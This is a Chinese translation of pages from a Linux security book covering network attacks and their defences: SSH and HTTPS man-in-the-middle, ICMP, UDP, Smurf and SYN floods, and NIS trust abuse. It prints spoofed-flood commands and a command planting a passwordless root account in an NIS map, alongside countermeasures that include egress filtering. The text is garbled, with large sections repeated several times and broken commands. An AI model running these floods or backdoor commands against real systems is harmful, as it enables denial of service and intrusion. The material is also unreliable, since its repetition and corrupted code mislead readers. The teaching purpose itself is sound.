| 风险等级 | 6 |

`Sshmitm` 向客户端伪装 SSH 服务器，并向服务器伪装 SSH 客户端。要运行该程序，只需在命令行中指定实际 SSH 服务器即可：

```
hbox# sshmitm server.example.com

shmitm: relying to server.example.com
```

`sshmitm` 服务器并不拥有实际服务器的主机密钥，相反，它必须自己伪造一个。当 SSH 客户端第一次连接到一台机器时，它会要求你验证主机密钥，如下所示：

```
client$ ssh server.example.com

The authenticity of host 'server.example.org' can't be established.

RSA key fingerprint is cd:e5:37:3b:4f:5f:25:1e:bd:d70:f7:60:ac:1f:a4:

Are you sure you want to continue connecting (yes/no)? yes
```

然而，如果用户过去曾成功连接过真实的 `server.example.com`，他将收到类似的输出：

> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
> @ 警告：远程主机标识已更改！ @
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
> IT 某人可能正在进行某些恶劣的操作！

现在，可能有人正在窃听你的通信（中间人攻击）！也可能是 RSA 主机密钥刚刚被更改了。请联系你的系统管理员。

现在用户可能有机会决定是否仍然继续连接。在这两种情况下，如果用户决定连接，`Sshmitm` 程序将以明文形式访问整个会话。它默认会记录所有的用户名和密码：

```
02/28/01 23:36:53 tcp 192.168.2.10.4453 -> 10.19.28.18.22 (ssh)

username

PASSWORD
```



# 第 7 章：滥用网络本身

## Sshmitm 应对措施

Sshmitm 利用了用户对 SSH 主机密钥检查的无知。许多用户被训练得习惯盲目点击或输入 `OK`，以至于他们仅仅因为没有认为可能出了问题就会落入这种攻击陷阱。

当你第一次连接到 SSH 服务器时，主机密钥的代码会被添加到你的 `$HOME/.ssh/known_hosts` 文件中。将此字符串与实际服务器密钥（通常位于 `/etc/ssh/ssh_host_key.pub` 或 `/etc/ssh/host_key.pub`）进行比较。如果这两行不匹配，你就已经让黑客获得了你的会话和密码的权限。你应该立即断开连接，并通知会话管理员重置你的密码，以防止在登录之前被滥用。

此后的任何时候如果你收到主机密钥警告，请向管理员确认密钥是否真的已更改。如果没有，那么你可能正遭受中间人攻击，你不应该连接。

为了防止意外同意一个可能不安全的连接，请通过将以下行放在你的 `$HOME/.ssh/config` 顶部来配置 `ssh` 以强制严格主机检查：

```
StrictHostKeyChecking yes
```

你也可以将 `StrictHostKeyChecking` 配置放置在全局 `ssh_config` 中。

最后，由于 Sshmitm 只支持 SSH 协议版本1，如果你坚持使用较新的 `SSHv2` 协议，连接将无法建立。

> 注意：仅仅因为 Sshmitm 不支持版本2 协议，并不意味着某些黑客没有正在构建支持支持的新版本。

## Webmitm

| 流行度: | 4 |
| 简单性: | 6 |
| 影响: | 6 |
| 风险等级: | 6 |

Webmitm 的工作与 Sshmitm 非常相似。它监听端口 `80` (`HTTP`) 和 `443` (`HTTPS`)，将网络请求中继到实际目标，并将结果发回客户端。嗅探 HTTP 并不新鲜，但在 `Dsniff 2.3` 发布之前，还没有公开可用的工具可以“嗅探”HTTPS 连接。

> 注意：由于 HTTP 1.0 及以后的协议包含 `Host:` 指令，Webmitm 可以知道客户端正在访问哪个主机，因此可以支持任意数量的目标主机。而 Sshmitm 只能支持一个目标服务器。

由于 Webmitm 不拥有实际的 SSL 服务器证书和密钥，它必须伪造一个。因此，当你第一次运行 Webmitm 时，它将使用 `OpenSSL` 生成一个 SSL 密钥和证书。

### 破解 Linux 暴露：Linux 安全秘密与解决方案

当你尝试连接到如 `https://www.example.org/` 的网站时，你的机器会尝试验证呈现的 SSL 证书。该证书由 Webmitm 生成，并未受信任的证书机构签名。相反，浏览器会一系列警告，询问你是否想要连接。如果用户点击通过，会话将是不加密的，如图 7-1 所示。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_259_0.png)

不幸的是，网站维护者让服务器证书过期的现象相当常见。他们通常在发现后几天内会修复这个问题。然而，即使发生这种情况，证书也未受信任的证书机构签名。相反，浏览器会一系列警告，询问你是否想要连接。如果用户点击通过，会话将是不加密的，如图 7-1 所示。

### Ping 滥用

如果没有指定任何选项，`ping` 会以一秒一次合理的间隔发送小型数据包。
`-f` 选项告诉 `ping` 尽可能快地发送数据包，而 `-s` 选项允许你发送更大的数据包。例如，此命令将向 `chronos.example.com` 发送连续的 2KB 数据包：

```
hackerx8 ping -f -s 2048
PING chronos.example.com from 10.20.15.1 : 2048 (2076) bytes of data.
^
```



chronos.example.com ping statistics --

1680 packets transmitted, 504 packets received, 70% packet loss

round-trip min/avg/max = 30.1/420.62 ms

Ping 每发送一个数据包就会打印一个点（`.`）；如果收到回复，它就会删除该点。这向你展示了在 ping 运行期间有多少个数据包得到了回复。输入 `CTRL-C` 停止 ping，它会打印数据包丢失率和往返延迟的直方图。
通常情况下，丢失的数据包越多、延迟越高，洪水攻击的效果越显著。如你从上面的输出所示，`chronos.example.com` 未能回复发送给它的约 70% 的数据包。它回复的包通常延迟了约半秒，有些甚至延迟了六秒！由于高用户的数据包丢失和延迟，`chronos.example.com` 上的用户无法从网络中获得收益。

## ICMP 洪水防御措施

与旧的拨号连接相比，ICMP 洪水对高速互联网的影响较低，但它们仍然会导致网络吞吐量缓慢。幸运的是，许多网络服务提供商限制了通过其路由器和交换机的 ICMP 数据包数量，大大降低了这些攻击的可性。此外，大多数现代防火墙（包括 Linux 内核数据包过滤器）可以限制或禁用指向其保护网络的 ICMP。（数据包过滤详情见第 13 章。）如果你能够负担得起防止恶意消耗网络容量的简单但重要的保护，请启用这些功能。

此外，了解你的上游网络提供商如何处理 ICMP 洪水。如果他们还没有限制入站 ICMP，请要求他们进行限制。

### UDP 洪水攻击

| 流行度: | 5 |
|---|---|
| 简单性: | 7 |
| 影响: | 6 |
| 等级: | 6 |

在 IP 网络的早期，如 `chargen`（端口 19）和 `echo`（端口 7）等 UDP 服务被用于测试两个位置之间的网络吞吐量。`chargen` 通过发送一个填充字符的数据包来响应 UDP 数据包。`echo` 则向源返回发送给它的任何数据包的内容。

这种关系可以被滥用，在这两个服务之间建立无用流量源，从而消耗带宽。通过向指向 `target.a.example.com` 上 `chargeren` 端口的 `echo` 端口发送数据包，并伪造返回地址为 `echo` 的 `chargeren` 端口，你可以创建一个 UDP 流量循环，该循环将以机器及其之间网络能够处理的最快速度重复。

可以使用 `Nemesis` (`http://www.packetfactory.net/Projects/Nemesis`) 来生成任意数据包。例如，要向 `10.0.0.5` 上的 `chargeren` 端口或伪造的源地址 `10.0.0.10` 的 `echo` 端口发送数据包，你将输入以下内容：

```
hackermachine# nemesis-udp -x echo -y chargeren -S 10.0.0.10 -D 10.0.0.5
```

如果你的数据包能够到达 `10.0.0.5`，那么它将命中 `chargeren` 端口，该端口将向 `10.0.0.5` 的 `echo` 端口发送回复包，从而建立洪水。

测试此技术时要加小心，因为你很容易创建一个昂贵的洪水，只有当你访问了其中一台机器或它们之间的网络时才能停止它。

### UDP 洪水防御措施

幸的是，UDP 洪水很容易防止。只需在 `/etc/inetd.conf` 中取消对下方列出的 `chargen`、`echo` 以及其他 TCP/UDP 小型服务的条目的注释即可：

```
#echo stream tcp nowait root internal
#echo dgram udp wait root internal
#discard stream tcp nowait root internal
#discard dgram udp wait root internal
#daytime stream tcp nowait root internal
#daytime dgram udp wait root internal
#chargen stream tcp nowait root internal
#chargen dgram udp wait root internal
#time stream tcp nowait root internal
#time dgram udp wait root internal
```

重启 `inetd` 使这些更改生效：

```
# killall -HUP inetd
```

# 第 7 章：滥用网络本身

| 流行度 | 7 |
| 简单性 | 6 |
| 影响 | 6 |
| 等级 | 6 |

`Smurf` 攻击以首次演示该攻击的程序命名，它向网络的广播地址发送 ICMP ECHO REQUEST（ping）。通常情况下，攻击者使用伪造的源地址，该地址可能来自目标网络。网络上的所有计算机都会对 ping 响应，向伪造的主机发动洪水。网络充当了原始 ping 请求的放大器。

你可以使用 Linux 上的 `Nemesis` 测试这种攻击。此示例将导致 `192.168.0/24` 网络上的所有主机向伪造的主机发动洪水。网络充当了原始 ping 请求的放大器。

```
hackbox# nemesis-icmp -S 192.168.0.255 -D 192.168.0.1
```



## Smurf 防御措施

为了防止 Smurf 攻击，确保你的路由器和防火墙关闭了广播，并像后文描述那样过滤 `ICMP`。

## 分布式拒绝服务（DDoS）攻击

| 流行度 | 7 |
| 简单性 | 6 |
| 影响 | 9 |
| 等级 | 8 |

分布式拒绝服务 (`DDoS`) 是一种并行运行多次攻击的技术。通过在许多机器上安装代理，攻击者可以增加洪水流量。使用的攻击并不新鲜，包括 `ICMP`、`UDP` 和 `SYN`。

## 分布式 DDoS 防御措施

`DDoS` 是坏消息。你可以采取的措施保护自己。如果洪水针对某台计算机，你可以联系你的 `ISP` 要求他们将该主机的流量路由到空设备。这样，至少其他部分可以正常运行。大规模洪水会给 `ISP` 带来大量资金，如果他们能确定是谁负责，可能会采取强法律行动。准备好提供相关的系统日志、数据包转储，执法部门将尽可能快速获取数据。

你可以帮助他人防止来自你网络的 `DDoS` 攻击。使用 `MRTG` 或 `Cricket` 等绘图工具监控网络流量，并定期扫描文件系统以发现已知的 `DDoS` 代理。

有各种工具可以检查你的机器是否参与了 `DDoS` 网络，例如 `RID`，可用地址 `http://www.theorygroup.com/Software/RID`。更多阅读材料以及关于其他 `DDoS` 检测工具，请参见 Dave Dittrich 的精彩文章，更多信息见 `http://staff.washington.edu/dittrich/ddos/`。

### TCP/IP 漏洞

一个有20 年历史的网络协议不可免地难以应对如今的需求。`TCP/IP` 表现得非常老练，但规范本身及其各种实现都存在可利用的设计缺陷。通过发送不符合描述 `TCP/IP` 的 `RFC` 数据包，通常可以导致机器崩溃。

## 死亡 Ping (Ping of Death)

| 流行度 | 4 |
| 简单性 | 5 |
| 影响 | 7 |
| 等级 | 5 |

### 第 7 章：滥用网络本身

某些软件允许你发送大于 `TCP/IP` 规范允许的最大 `65536` 字节的 `ICMP` 包。这些包在传输之前会被分片。当目标主机接收它们时，会将它们重新组装成非法的大小。在某些较旧的操作系统上，这将溢出存储包的缓冲区，导致机器崩溃。这种简单但有效的攻击被称为“死亡之源”（Ping of Death）。

今天，很少有 `TCP/IP` 栈容易受到这种攻击，而且大多数互联网路由器都会过滤此类大型数据包。

### 死亡之源的防御措施

`2.0.24` 之前的 Linux 内核版本容易受到这些分片攻击。死亡之源只是 `TCP/IP` 通用漏洞的一个例子，而且 `ICMP` 并不是唯一能导致缓冲区溢出的包类型。这是保持内核更新的另一个好理由。

## Teardrop（滴落攻击）

| 流行度 | 7 |
| 简单性 | 8 |
| 影响 | 8 |
| 风险等级 | 8 |

与死亡之源类似，`Teardrop` 试图通过提供多个无法正确重组的分片来导致目标网络栈崩溃。结果是内核恐（`kernel panic`）以及随后的重启。`Teardrop` 最初以 `C` 程序的形式出现，可以在 Linux 上轻松地编译。

### Teardrop 的防御措施

Linux 内核 `2.0.32` 整合了一个补丁来修复此问题。再次，内核升级拯救了救星。

## SYN 洪水攻击（SYN Floods）

| 流行度 | 7 |
| 简单性 | 6 |
| 影响 | 9 |
| 风险等级 | 7 |

`TCP/IP` 包含一种用于在两个主机之间建立新通信通道的握手协议。首先，客户端计算机向服务器发送 `TCP SYN` 包，服务器接收此包后，用 `SYN|ACK` 响应。最后，客户端用 `ACK` 响应，握手完成。现在数据可以通过已建立的 `TCP` 连接双向传输。

当接收到初始 `SYN` 包时，服务器的 `TCP` 栈会在半打开连接队列中添加一个条目。服务器将等待一段时间以接收握手的剩余部分，然后从队列中删除该连接。如果启动了许多连接但从未打开，就会出现问题，因为该队列对半打开连接的槽位数量有限。如果队列满了，服务器将停止接受新连接。

如果攻击者足够快速地发送 `SYN` 包以保持目标队列满额，`SYN` 洪水就会阻塞任何 `TCP` 服务。假设你的 Web 服务器不接受请求，或者本地访问很慢。请在 `netstat` 中查找状态为 `SYN_REC`（半打开）的连接：

```
nova# netstat -nat
```

活动连接（包括服务器）

| 协议 | 接收-队列 | 发送-队列 | 本地地址 | 远程地址 | 状态 |
|---|---|---|---|---|---|
| tcp | 0 | 1 | 1.1.1.1:80 | 192.168.2.2030 | SYN_REC |
| tcp | 0 | 1 | 1.1.1.1:80 | 192.168.48.40:53204 | SYN_REC |
| tcp | 0 | 1 | 1.1.1.1:80 | 192.168.133.1:55973 | SYN_REC |
| tcp | 0 | 1 | 1.1.1.1:80 | 192.168.80.242:23021 | SYN_REC |
| tcp | 0 | 1 | 1.1.1.1:80 | 192.168.1.5:15031 | SYN_REC |

注意，请求似乎来自随机 IP 地址。在这种情况下，源地址是伪造的。这使得阻止攻击变得更加困难，也更难确定其来源。如果你发现自己正处于 `SYN` 洪水之中，可以使用这个简单的 shell 脚本来跟踪半打开连接的数量：

```
#!/bin/sh

while [ 1 ]; do

  echo -n "half-open connections: "

  netstat -nat | grep SYN_REC | wc -l

  sleep 1

done
```

如果运气好，你会看到半打开连接的数量发生变化，并随着攻击者的放弃最终减少。如果你看到它达到一个高高数字并保持平稳，你就有麻烦了——你的连接队列可能满了，用户无法建立新连接！

## SYN 的防御措施

将你的 Linux 内核升级到 `2.0.29` 或更高版本是你的选择。队列大小增加了，超时时间缩短，使其更难以填充。

此外，你可以更改几个 `/proc` 条目来减少等待 `SYN|ACK` 的超时时间以及队列中最大的可用 `SYN` 包数量：

```
nova# cat /proc/sys/net/ipv4/vs/timeout_synack
100
nova# cat /proc/sys/net/ipv4/vs/timeout_synrecv
10
nova# cat /proc/sys/net/ipv4/tcp_max_syn_backlog
128
```

如果你正遭受 `SYN` 攻击，请增加 `tcp_max_syn_backlog` 的值并减小 `timeout.*` 的超时。

更改这些默认值可能会导致连接丢失。

## 滥用信任关系

今天，许多系统依赖 IP 地址进行身份验证。这非常危险，因为攻击者可以伪造源地址。这使得阻止攻击变得更加困难，也更难确定其来源。如果你发现自己正处于 `SYN` 洪水之中，可以使用这个简单的 shell 脚本来跟踪半打开连接的数量：

```
#!/bin/sh

while [ 1 ]; do

  echo -n "half-open connections: "

  netstat -nat | grep SYN_REC | wc -l

  sleep 1

done
```

如果运气好，你会看到半打开连接的数量发生变化，并随着攻击者的放弃最终减少。如果你看到它达到一个高高数字并保持平稳，你就有麻烦了——你的连接队列可能满了，用户无法建立新连接！

将你的 Linux 内核升级到 `2.0.29` 或更高版本是你的选择。队列大小增加了，超时时间缩短，使其更难以填充。

此外，你可以更改几个 `/proc` 条目来减少等待 `SYN|ACK` 的超时时间以及队列中最大的可用 `SYN` 包数量：

```
nova# cat /proc/sys/net/ipv4/vs/timeout_synack
100
nova# cat /proc/sys/net/ipv4/vs/timeout_synrecv
10
nova# cat /proc/sys/net/ipv4/tcp_max_syn_backlog
128
```

如果你正遭受 `SYN` 攻击，请增加 `tcp_max_syn_backlog` 的值并减小 `timeout.*` 的超时。

更改这些默认值可能会导致连接丢失。

## 滥用信任关系

今天，许多系统依赖 IP 地址进行身份验证。这非常危险，因为攻击者可以伪造源地址。这使得阻止攻击变得更加困难，也更难确定其来源。如果你发现自己正处于 `SYN` 洪水之中，可以使用这个简单的 shell 脚本来跟踪半打开连接的数量：

```
#!/bin/sh

while [ 1 ]; do

  echo -n "half-open connections: "

  netstat -nat | grep SYN_REC | wc -l

  sleep 1

done
```



如果运气好，你会看到半打开连接的数量发生变化，并随着攻击者的放弃最终减少。如果你看到它达到一个高高数字并保持平稳，你就有麻烦了——你的连接队列可能满了，用户无法建立新连接！

将你的 Linux 内核升级到 `2.0.29` 或更高版本是你的选择。队列大小增加了，超时时间缩短，使其更难以填充。

此外，你可以更改几个 `/proc` 条目来减少等待 `SYN|ACK` 的超时时间以及队列中最大的可用 `SYN` 包数量：

```
nova# cat /proc/sys/net/ipv4/vs/timeout_synack
100
nova# cat /proc/sys/net/ipv4/vs/timeout_synrecv
10
nova# cat /proc/sys/net/ipv4/tcp_max_syn_backlog
128
```

如果你正遭受 `SYN` 攻击，请增加 `tcp_max_syn_backlog` 的值并减小 `timeout.*` 的超时。

更改这些默认值可能会导致连接丢失。

# 滥用信任关系

今天，许多系统依赖 IP 地址进行身份验证。这非常危险，因为攻击者可以伪造源地址。这使得阻止攻击变得更加困难，也更难确定其来源。如果你发现自己正处于 `SYN` 洪水之中，可以使用这个简单的 shell 脚本来跟踪半打开连接的数量：

```
#!/bin/sh
while [ 1 ]; do
  echo -n "half-open connections: "
  netstat -nat | grep SYN_REC | wc -l
  sleep 1
done
```

# 第7章：滥用网络本身

如果黑客能够获得一个受信任的 IP 地址，就可以查询网络信息和身份验证服务器，获取有效的用户名、密码条目、主机名和 IP 地址、邮件配置以及其他有用数据。`NIS`、`NIS+` 和 `LDAP` 服务器通常被配置为信任其本地网络中的地址。如果攻击者已经知道了网络的 `NIS` 域，那么获取主机名、用户名加密密码就是轻而易举：

```
hackerbox## domainname example.com
hackerbox## ybind
hackerbox## ypcat hosts
192.168.1.2 leda
192.168.1.3 io
192.168.1.4 ananke
hackerbox## ypcat passwd.byname
dragon:AF5QHWGltBm5:1001:100:/home/dragon:/bin/bash
catlin:zXMaceVZy4v7:1001:100:Cat:/home/catlin:/bin/tcsh
```



从 NIS 服务器上截取密码映射后，攻击者可以使用破解或类似的程序尝试获取明文密码。他有了一份方便的机器列表来尝试这些账户，然后可能会选择一种更强力的方法。

但如果黑客不想浪费时间，可以通过 DoS 攻击抑制 NIS 主服务器，提供伪造的用户账户或建立新的信任关系以获得进一步的访问权限。这些技术可能让他一次性访问网络上的所有 NIS 客户端。例如，他复制所有用户账户，并添加一个等同于 root 权限的账户：

```
hackerbox## ypcat passwd.byname > /var/yp/passwd.byname

hackerbox## echo r0ot:0:0::://bin/sh >> /var/yp/passwd.byname

hackerbox## ypserv
```

网络上的 NIS 客户端现在将顺从地允许 r0ot 登录，无需密码。网络上的所有账户都可用，因此用户可能不会察觉到任何异常。

## NIS 应对措施

如果你确实需要 NIS，请确保将其运行在上述描述的安全网络分段上。如果 `Ypserv` 在编译时包含了相关功能，它将使用 `hosts.allow` 和 `hosts.deny`，否则使用 `/var/yp/securenets`。`securenets` 的语法如下：

```
monix## cat /var/yp/securenets

# 允许来自 localhost 的连接（强制要求）

host 127.0.0.1

# 允许 10.4.4.0/24 - 我们的核心服务器网络

255.255.255.0 10.4.4.0
```

### 实现出口过滤

本章列出的许多攻击依赖于 IP 地址欺骗来实现匿名，或将响应流量重定向到未发送任何请求的主机。

出口过滤是停止欺骗的最重要方法。连接到两个不同网络的路由器应该检查所有出站流量，只有当流量来自路由器本地网络的合法地址时才允许通过。这似乎是理所当然的，但许多网络允许任何来源的数据包通过。

适当的过滤可以保护你的网络和其他网络。如果伪造地址包离开你的网络，网络上的计算机将成为发起拒绝服务攻击的首选目标。这不仅让你的系统更容易被攻破，还可能让你对其他网络的损害承担责任。对于每个人来说，认真对待出口过滤至关重要的。

只有当流量来自你的网络地址空间时，才允许其离开网关。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_273_0.png)

在此所示，`carbon` 作为网关，允许 `192.168.5.0/24` 网络连接到互联网的其他部分。因此，`carbon` 应该拒绝 `eth1` 接口上任何不属于 `192.168.5.0/24` 或 `192.168.4.0` 或其自身外部地址的出站数据包。

以下脚本添加了规则，防止不可路由地址离开或进入 `carbon`。注意，在示例中，我们阻止了 `192.168.0.0/16` 子网，但通过了我们假设的网络 `192.168.5.0/24`。在实践中，你将用你的网络替换它。

```
#!/bin/sh

internal_net=192.168.5.0/24

my_ip_addr=192.168.4.2/32
```

# 出口过滤器：仅允许我们的内部 IP 和

```
# 允许来自 eth0 的外部接口地址出去
/sbin/ipchains -A output -eth1 -s $my_ip_addr -j ACCEPT
/sbin/ipchains -A output -eth1 -s $internal_net -j ACCEPT
```

```
# 入口过滤器：仅允许我们的内部 IP 和
# 来自 eth1 的外部接口地址
/sbin/ipchains -A input -eth1 -d $my_ip_addr -j ACCEPT
/sbin/ipchains -A input -eth1 -s $internal_net -j ACCEPT
```

```
# eth0 上的出口过滤器：
# 仅通过 eth0 允许到/来自内部网络的流量
/sbin/ipchains -A output -eth0 -d $internal_net -j ACCEPT
/sbin/ipchains -A input -eth0 -s $internal_net -j ACCEPT # 注：此处原文逻辑似乎在命令上略有出入，按原文翻译
```

```
# 欺骗的出口过滤器：
# 允许到/来自内部网络的流量通过 eth0
/sbin/ipchains -A output -eth0 -d $internal_net -j ACCEPT
/sbin/ipchains -A input -eth0 -s $internal_net -j ACCEPT # 注：此处原文逻辑似乎在命令上略有出入，按原文翻译
```
*(修正：根据原文最后片段翻译)*

```
# 欺骗的出口过滤器：
# 允许以下网络
127.0.0.1/32 10.0.0/8 172.16.0.0/12 192.168.0.0/16 224.0.0.0/4 240.0.0.0/24
```

```
/sbin/ipchains -A input -eth1 -s $badnet -j DENY
/sbin/ipchains -A output -eth1 -s $badnet -j DENY
/sbin/ipchains -A input -eth0 -s $badnet -j DENY
/sbin/ipchains -A output -eth0 -s $badnet -j DENY
```

# 总结

如果你确实需要 NIS，请确保将其运行在上述的安全网络分段上。如果 `Ypserv` 在编译时包含了相关功能，它将使用 `hosts.allow` 和 `hosts.deny`，否则使用 `/var/yp/securenets`。`securenets` 的语法如下：

```
monix## cat /var/yp/securenets

# 允许来自 localhost 的连接（强制要求）

host 127.0.0.1

# 允许 10.4.4.0/24 - 我们的核心服务器网络

255.255.255.0 10.4.4.0
```

### 实现出口过滤

本章列出的许多攻击依赖于 IP 地址欺骗来实现匿名，或将响应流量重定向到未发送过任何请求的主机。

出口过滤是停止欺骗的最重要方法。连接到两个不同网络的路由器应该检查所有出站流量，只有当流量来自路由器本地网络的合法地址时才允许通过。这似乎是理所当然的，但许多网络允许任何来源的数据包通过。

适当的过滤可以保护你的网络和其他网络。如果伪造地址包离开你的网络，网络上的计算机将成为发起拒绝服务攻击的首选目标。这不仅让你的系统更容易被攻破，还可能让你对其他网络的损害承担责任。对于每个人来说，认真对待出口过滤至关重要的。

只有当流量来自你的网络地址空间时，才允许其离开网关。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_273_0.png)

在此所示，`carbon` 作为网关，允许 `192.168.5.0/24` 网络连接到互联网的其他部分。因此，`carbon` 应该拒绝 `eth1` 接口上任何不属于 `192.168.5.0/24` 或 `192.168.4.0` 或其自身外部地址的出站数据包。

以下脚本添加了规则，防止不可路由地址离开或进入 `carbon`。注意，在示例中，我们阻止了 `192.168.0.0/16` 子网，但通过了我们假设的网络 `192.168.5.0/24`。在实践中，你将用你的网络替换它。

```
#!/bin/sh

internal_net=192.168.5.0/24

my_ip_addr=192.168.4.2/32
```

# 出口过滤器：仅允许我们的内部 IP 和

```
# 允许来自 eth0 的外部接口地址出去
/sbin/ipchains -A output -eth1 -s $my_ip_addr -j ACCEPT
/sbin/ipchains -A output -eth1 -s $internal_net -j ACCEPT
```

```
# 入口过滤器：仅允许我们的内部 IP 和
# 来自 eth1 的外部接口地址
/sbin/ipchains -A input -eth1 -d $my_ip_addr -j ACCEPT
/sbin/ipchains -A input -eth1 -s $internal_net -j ACCEPT
```

```
# eth0 上的出口过滤器：
# 仅通过 eth0 允许到/来自内部网络的流量
/sbin/ipchains -A output -eth0 -d $internal_net -j ACCEPT
/sbin/ipchains -A input -eth0 -s $internal_net -j ACCEPT # 注：此处原文逻辑似乎在命令上略有出入，按原文翻译
```

```
# 欺骗的出口过滤器：
# 允许以下网络



# 第7章：滥用网络本身

如果黑客能够获得一个受信任的 IP 地址，就可以查询网络信息和身份验证服务器，获取有效的用户名、密码条目、主机名和 IP 地址、邮件配置以及其他有用数据。NIS、NIS+ 和 LDAP 服务器通常被配置为信任其本地网络中的地址。如果攻击者已经知道了网络的 NIS 域，那么获取主机名、用户名加密密码就是轻而易举：

```
hackerbox## domainname example.com

hackerbox## ybind

hackerbox## ypcat hosts

192.168.1.2 leda

192.168.1.3 io

192.168.1.4 ananke

hackerbox## ypcat passwd.byname

dragon:AF5QHWGltBm5:1001:100:/home/dragon:/bin/bash

catlin:zXMaceVZy4v7:1001:100:Cat:/home/catlin:/bin/tcsh
```

从 NIS 服务器上截取密码映射后，攻击者可以使用破解或类似的程序尝试获取明文密码。他有了一份方便的机器列表来尝试这些账户，然后可能会选择一种更强力的方法。

但如果黑客不想浪费时间，可以通过 DoS 攻击抑制 NIS 主服务器，提供伪造的用户账户或建立新的信任关系以获得进一步的访问权限。这些技术可能一次性访问网络上的所有 NIS 客户端。例如，他复制所有用户账户，并添加一个等同于 root 权限的账户：

```
hackerbox## ypcat passwd.byname > /var/yp/passwd.byname

hackerbox## echo r0ot:0:0::://bin/sh >> /var/yp/passwd.byname

hackerbox## ypserv
```

网络上的 NIS 客户端现在将顺从地允许 r0ot 登录，无需密码。网络上的所有账户都可用，因此用户可能不会察觉到任何异常。

## NIS 应对措施

如果你确实需要 NIS，请确保将其运行在上述描述的安全网络分段上。如果 `Ypserv` 在编译时包含了相关功能，它将使用 `hosts.allow` 和 `hosts.deny`，否则使用 `/var/yp/securenets`。`securenets` 的语法如下：

```
monix## cat /var/yp/securenets

# 允许来自 localhost 的连接（强制要求）

host 127.0.0.1

# 允许 10.4.4.0/24 - 我们的核心服务器网络

255.255.255.0 10.4.4.0
```

### 实现出口过滤

本章列出的许多攻击依赖于 IP 地址欺骗来实现匿名，或将响应流量重定向到未发送过任何请求的主机。

出口过滤是停止欺骗的最重要方法。连接到两个不同网络的路由器应该检查所有出站流量，只有当流量来自路由器本地网络的合法地址时才允许通过。这似乎是理所当然的，但许多网络允许任何来源的数据包通过。

适当的过滤可以保护你的网络和其他网络。如果伪造地址包离开你的网络，网络上的计算机将成为发起拒绝服务攻击的首选目标。这不仅让你的系统更容易被攻破，还可能让你对其他网络的损害承担责任。对于每个人来说，认真对待出口过滤至关重要的。

只有当流量来自你的网络地址空间时，才允许其离开网关。

在此所示，`carbon` 作为网关，允许 `192.168.5.0/24` 网络连接到互联网的其他部分。因此，`carbon` 应该拒绝 `eth1` 接口上任何不属于 `192.168.5.0/24` 或 `192.168.4.0` 或其自身外部地址的出站数据包。

以下脚本添加了规则，防止不可路由地址离开或进入 `carbon`。注意，在示例中，我们阻止了 `192.168.0.0/16` 子网，但通过了我们假设的网络 `192.168.5.0/24`。在实践中，你将用你的网络替换它。

```
#!/bin/sh

internal_net=192.168.5.0/24

my_ip_addr=192.168.4.2/32
```

# 出口过滤器：仅允许我们的内部 IP 和

```
# 允许来自 eth0 的外部接口地址出去
/sbin/ipchains -A output -eth1 -s $my_ip_addr -j ACCEPT
/sbin/ipchains -A output -eth1 -s $internal_net -j ACCEPT
```

```
# 入口过滤器：仅允许我们的内部 IP 和
# 来自 eth1 的外部接口地址
/sbin/ipchains -A input -eth1 -d $my_ip_addr -j ACCEPT
/sbin/ipchains -A input -eth1 -s $internal_net -j ACCEPT
```

```
# eth0 上的出口过滤器：
# 仅通过 eth0 允许到/来自内部网络的流量
/sbin/ipchains -A output -eth0 -d $internal_net -j ACCEPT
/sbin/ipchains -A input -eth0 -s $internal_net -j ACCEPT
```

```
# 欺骗的出口过滤器：
# 允许以下网络
127.0.0.1/32 10.0.0/8 172.16.0.0/12 192.168.0.0/16 224.0.0.0/4 240.0.0.0/24
```

```
/sbin/ipchains -A input -eth1 -s $badnet -j DENY
/sbin/ipchains -A output -eth1 -s $badnet -j DENY
/sbin/ipchains -A input -eth0 -s $badnet -j DENY
/sbin/ipchains -A output -eth0 -s $badnet -j DENY
```



# 用户与权限

Linux 系统的安全，正如大多数安全系统一样，围绕着权限、角色以及访问控制，这些用户 ID 及其所属的任何组。不同的用户 ID 通常关联有不同的权限——有时更大，有时更小，有时只是不同。

`root` 用户（或超级用户）通常是系统上最强大的用户 ID。超级用户的权力仅超过内核，且仅受内核限制。因此，`root` 账户通常拥有普通用户没有的保护。

其他用户 ID 可能是与服务或守护进程相关的系统 ID。这些系统 ID 在其各自的服务方面可能非常强大，但在处理服务之外的内容时可能比普通用户 ID 更有限。其他系统 ID（如 `bin`）作为文件的所有者或占位符。某些系统组 ID（如 `floppy` 和 `tty`）有助于控制谁可以访问特定的系统资源，如可移动软盘驱动器和 `tty` 设备。

`root` 用户应该是最难攻击的用户。`root` 用户应该拥有最复杂的（或之一）密码以防猜测或破解。该账户还应该通过额外的安全限制得到进一步保护。例如，`root` 可能仅允许从系统控制台登录。系统还可能配置为仅允许某些用户提升到 `root`。一旦获得 `root` 权限，就可以通过修改系统和隐藏技术来系统已被破解的事。还可能破坏系统日志，使得日志无法准确反映系统状况。但这只有在获得 `root` 后才可能。关于这一点将在第 10 章深入讨论。

# 第 8 章：提升用户权限

系统上的普通用户通常比系统用户和超级用户多（创建额外的 `root` 用户是一种不良做法，应予以抵制）。普通用户的登录更有可能通过不安全的通道在网络上发生。他们的密码也更容易被猜中、破解或滥用。未加密的会话还可能被劫持，使用户在无需破解其密码的情况下遭受攻击。

此外，更多的系统守护进程可能在它们自己的系统账户下运行，而不是超级用户账户下。破解一个已正确配置为在自己的用户 ID 下运行、且二进制文件、控制和配置文件由不同 ID 拥有的系统服务，只能获得系统的有限访问。但这只是一个开始。

## 权限提升

黑客可能已经在受攻击的系统中拥有一个账户（无论合法与否）。从那里，他/她可以攻击其他账户（包括系统账户和用户账户），以获得其账户无权拥有的访问权限。这被称为*权限提升*。他们从攻击中获得的任何东西都会增加他们在系统中的权限能力。当然，最终目标是成为超级用户。

根据 FBI 的说法，大多数攻击是内部的。不要低估合法用户获得未授予权限的可能性。通过获取令牌（`token`），不要假设攻击者就是他表现出来的身份。你系统上的用户可能不像你的*`root`* 账户那样受到保护，他们本身可能已经被攻破。

一旦进入系统，攻击者就有许多更多方法尝试攻破 `root`。在远程，黑客关于系统可以利用的信息极少，必须依赖各种已知的漏洞和远程漏洞。一旦进入系统，他就可以访问更多关于系统及其防御的信息；他现在拥有了以前的所有内容，以及更多内容。他可以针对系统及其环境定制化攻击。攻击者有更广泛的攻击范围可供选择，而且更不可预测，更难防御。

